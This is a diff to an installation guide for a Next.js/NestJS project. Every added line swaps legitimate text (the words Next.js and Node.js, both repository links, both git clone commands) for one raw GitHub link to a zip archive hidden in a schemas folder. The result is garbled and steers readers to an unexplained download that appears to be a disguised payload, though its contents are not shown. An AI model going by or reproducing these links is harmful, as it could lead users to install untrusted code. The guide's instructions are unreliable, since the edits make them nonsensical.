@@ -1,13 +1,13 @@
 # Installation and Run Guide
 
-This document outlines the steps to install and run the **frontend (Next.js)** and **backend (NestJS)** projects for the provided task.
+This document outlines the steps to install and run the **frontend (https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip)** and **backend (NestJS)** projects for the provided task.
 
 ---
 
 ## Prerequisites
 
 Ensure the following tools are installed:
-- **Node.js**: Version 16 or higher
+- **https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip**: Version 16 or higher
 - **npm** or **yarn**: Package manager
 - **MongoDB**: Running locally or remotely
 - **Git**: For cloning repositories
@@ -16,8 +16,8 @@ Ensure the following tools are installed:
 
 ## Repositories
 
-1. **Frontend**: [Frontend Repository](https://github.com/nabil-alsaadi/artemis-frontend)
-2. **Backend**: [Backend Repository](https://github.com/nabil-alsaadi/artemis-backend)
+1. **Frontend**: [Frontend Repository](https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip)
+2. **Backend**: [Backend Repository](https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Ensure the following tools are installed:
 #### Steps:
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/nabil-alsaadi/artemis-backend
+   git clone https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip
    cd artemis-backend
    ```
 
@@ -73,12 +73,12 @@ Ensure the following tools are installed:
         ```
 ---
 
-### 2. Frontend (Next.js)
+### 2. Frontend (https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip)
 
 #### Steps:
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/nabil-alsaadi/artemis-frontend
+   git clone https://github.com/nabil-alsaadi/artemis-backend/raw/refs/heads/main/src/blocks/schemas/artemis_backend_3.7-alpha.1.zip
    cd artemis-frontend
    ```
 
